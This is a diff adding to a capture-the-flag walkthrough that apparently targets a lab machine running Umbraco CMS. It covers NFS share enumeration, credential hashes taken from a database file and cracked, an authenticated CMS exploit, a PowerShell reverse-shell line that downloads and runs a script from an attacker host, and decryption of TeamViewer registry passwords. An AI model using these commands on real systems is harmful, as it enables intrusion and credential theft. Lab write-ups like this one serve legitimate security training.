@@ -132,3 +132,68 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 - Nothing found on `SMB` and `FTP`
 
 ![](./images/4.png)
+
+- We can also check `nfs` on port `2049` which was returned by `nmap`
+```
+└─$ showmount -e 10.10.10.180
+Export list for 10.10.10.180:
+/site_backups (everyone)
+```
+
+## Foothold/User
+- Let's mount it
+
+![](./images/5.png)
+
+- If we check `App_Data` we will find [SDF file](https://fileinfo.com/extension/sdf)
+  - Which is `a file that contains a compact relational database saved in the SQL Server Compact (SQL CE) format, which is developed by Microsoft`
+  - We can search for tools to open it
+  - But we can try using `strings` just to see its' contents: `strings Umbraco.sdf | less`
+  - Found some creds
+    - `admin@htb.local:b8be16afba8c314ad33d812f22a04991b90e2aaa`
+    - `smith@htb.local:jxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts=`
+  - Crack them right away
+    - `admin@htb.local:baconandcheese`
+
+![](./images/6.png)
+![](./images/7.png)
+
+- Creds work, now we can access `CMS`
+
+![](./images/8.png)
+
+- Let's try one of the exploits
+  - Change `login`, `host`, `password`, `cmd` and `proc.StartInfo.FileName`.
+
+![](./images/9.png)
+![](./images/10.png)
+![](./images/11.png)
+
+- Let's get a reverse shell
+  - `cmd` = `/c powershell -c iex(new-object net.webclient).downloadstring('http://10.10.16.12:8000/shell.ps1')`
+
+![](./images/12.png)
+
+## Root
+- Let's upload `winpeas` and run it
+  - We have a list of interesting services
+  - `TeamViewer`
+
+![](./images/13.png)
+
+- There is a module in metasploit to gather [TeamViewer credentials](https://github.com/rapid7/metasploit-framework/blob/master//modules/post/windows/gather/credentials/teamviewer_passwords.rb)
+  - Let's retrieve a password for registry: `HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version7`
+    - `OptionsPasswordAES`, `SecurityPasswordAES`, `SecurityPasswordExported`, `ServerPasswordAES`, `ProxyPasswordAES`, `LicenseKeyAES`
+
+
+![](./images/14.png)
+![](./images/15.png)
+
+- According to module, it looks like `TeamViewer` uses static `key` and `iv`
+  - Using `metasploit`'s module as reference we can write own script to decrypt the password
+
+![](./images/16.png)
+
+- You can use `evil-winrm`, `psexec` or `wmiexec` to connect as Administrator
+
+![](./images/17.png)
